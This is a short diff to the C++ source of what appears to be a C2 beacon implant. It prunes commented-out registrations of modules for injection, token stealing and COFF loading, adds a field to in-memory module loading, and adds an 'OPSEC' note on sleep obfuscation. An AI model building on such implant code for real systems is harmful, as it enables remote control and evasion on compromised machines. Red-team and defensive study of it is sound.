@@ -95,26 +95,13 @@ Beacon::Beacon(const std::string& ip, int port)
 
 	srand(time(NULL));
 
-// TODO at some point chose which module are directly included 
-// #ifdef __linux__
-
-// 	std::unique_ptr<AssemblyExec> assemblyExec = std::make_unique<AssemblyExec>();
-// 	m_moduleCmd.push_back(std::move(assemblyExec));
+// TODO at some point chose which module are directly included , could be this list:
 
 // 	std::unique_ptr<Upload> upload = std::make_unique<Upload>();
 // 	m_moduleCmd.push_back(std::move(upload));
 
-// 	std::unique_ptr<Run> run = std::make_unique<Run>();
-// 	m_moduleCmd.push_back(std::move(run));
-
 // 	std::unique_ptr<Download> download = std::make_unique<Download>();
 // 	m_moduleCmd.push_back(std::move(download));
-
-// 	std::unique_ptr<Inject> inject = std::make_unique<Inject>();
-// 	m_moduleCmd.push_back(std::move(inject));
-	
-// 	std::unique_ptr<Script> script = std::make_unique<Script>();
-// 	m_moduleCmd.push_back(std::move(script));
 
 // 	std::unique_ptr<PrintWorkingDirectory> printWorkingDirectory = std::make_unique<PrintWorkingDirectory>();
 // 	m_moduleCmd.push_back(std::move(printWorkingDirectory));
@@ -128,20 +115,6 @@ Beacon::Beacon(const std::string& ip, int port)
 // 	std::unique_ptr<ListProcesses> listProcesses = std::make_unique<ListProcesses>();
 // 	m_moduleCmd.push_back(std::move(listProcesses));
 
-// 	std::unique_ptr<MakeToken> makeToken = std::make_unique<MakeToken>();
-// 	m_moduleCmd.push_back(std::move(makeToken));
-	
-// 	std::unique_ptr<Rev2self> rev2self = std::make_unique<Rev2self>();
-// 	m_moduleCmd.push_back(std::move(rev2self));
-
-// 	std::unique_ptr<StealToken> stealToken = std::make_unique<StealToken>();
-// 	m_moduleCmd.push_back(std::move(stealToken));
-
-// 	std::unique_ptr<CoffLoader> coffLoader = std::make_unique<CoffLoader>();
-// 	m_moduleCmd.push_back(std::move(coffLoader));
-
-// #elif _WIN32
-// #endif
 
 #ifdef __linux__
 
@@ -561,6 +534,9 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 #ifdef __linux__
 #elif _WIN32
 
+		// TODO add a map of loaded modules, with inputfile/handled, to check of a module is already loaded and to be able to unload the handler
+
+		const std::string inputfile = c2Message.inputfile();
 		const std::string buffer = c2Message.data();
 
 		HMEMORYMODULE handle = NULL;
@@ -661,6 +637,7 @@ bool Beacon::execInstruction(C2Message& c2Message, C2Message& c2RetMessage)
 	return false;
 }
 
+// OPSEC enable sleep obfuscation for x64
 
 // #define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
 // #define NtCurrentThread() (  ( HANDLE ) ( LONG_PTR ) -2 )
